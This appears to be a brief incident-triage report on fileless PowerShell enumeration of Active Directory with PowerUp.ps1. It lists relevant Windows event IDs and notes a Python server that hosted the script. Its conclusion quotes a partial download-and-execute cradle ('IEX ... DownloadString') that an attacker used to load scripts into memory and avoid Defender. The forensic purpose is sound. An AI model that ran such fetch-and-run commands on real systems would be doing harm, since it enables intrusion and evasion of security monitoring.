# Fileless Enumeration

![Fileless Download](resources/FIleless.png)

## Table of content

  1. [SECURITY EVENTS TRIAGE](#security-events-triage)
  2. [VULNERABILITY DETECTION](#vulnerability-detection)  
  3. [CONSLUSIONS](#conclusions)


## SECURITY EVENTS TRIAGE
## Table of content 

  1.1 [ACTIVE DIRECTORY SIDE](#active-directory-side)
  
  1.2 [CLIENT01 SID](#client01-side)
  
  
### ACTIVE DIRECTORY SIDE
After security events triage, the most important evidences could be find on the following list :

```
EVTX:
4104 x 49

```
Powershell load the script [PowerUp.ps1] on dynamic process memory:

![fileless Load_powerup](resources/fileless_load_1.png)

![fileless Load_powerup](resources/fileless_load_1.png)

### CLIENT01 SIDE
After security events triage, the most important evidences could be find on the following list :

```
EVTX:
5156

```
Python server with the [PowerUp.ps1] script content on the source machine:

![Python Server](resources/python_server.png)

## VULNERABILITY DETECTION

This section not contains vulnerabilities, the threat user abusse the privileges of user [worker01] for enumerate the Active Directory and look for the attack vector: 

![fileless output](resources/Fileless_ActiveDirectory.png)

## CONCLUSIONS

The threat actor, load directly on memory the required ps1 scripts for enumeration and bypass the Windows Defender RealTime monitoring using the following command:

```
IEX (New-Object net.webclient).DownloadString
```
